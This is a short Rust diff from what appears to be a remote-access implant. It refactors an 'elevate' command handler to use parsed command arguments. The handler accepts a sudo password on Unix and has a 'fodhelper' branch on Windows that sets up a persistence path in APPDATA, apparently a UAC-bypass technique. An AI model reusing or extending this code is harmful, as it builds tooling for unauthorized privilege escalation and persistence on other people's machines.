@@ -2,6 +2,7 @@ use std::error::Error;
 use sysinfo::{System, SystemExt, UserExt};
 use whoami::username;
 use crate::config::ConfigOptions;
+use crate::cmd::CommandArgs;
 use std::env::args;
 use std::process::Command;
 #[cfg(windows)] use std::env::{var};
@@ -45,13 +46,12 @@ pub fn can_elevate() -> bool {
 /// 
 /// Because we can't wait for the output of the child process, 
 /// we toss the handle.
-pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
+pub async fn handle(mut cmd_args: CommandArgs, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
     if can_elevate() {
-        let mut elevate_args = s.split(" ");
         #[cfg(not(windows))] {
-            match elevate_args.nth(0).unwrap().trim() {
+            match cmd_args.nth(0).unwrap().as_str() {
                 "sudo" => {
-                    let pwd = elevate_args.nth(0).unwrap();
+                    let pwd = cmd_args.nth(0).unwrap();
                     // Check for empty pw
                     if pwd.is_empty() {
                         return Ok("Need a sudo password!".to_string());
@@ -70,7 +70,7 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
         }
 
         #[cfg(windows)] {
-            match elevate_args.nth(0).unwrap().trim() {
+            match cmd_args.nth(0).unwrap().as_str() {
                 "fodhelper" => {
                     if let Ok(v) = var("APPDATA") {
                         let mut persist_path: String = v;
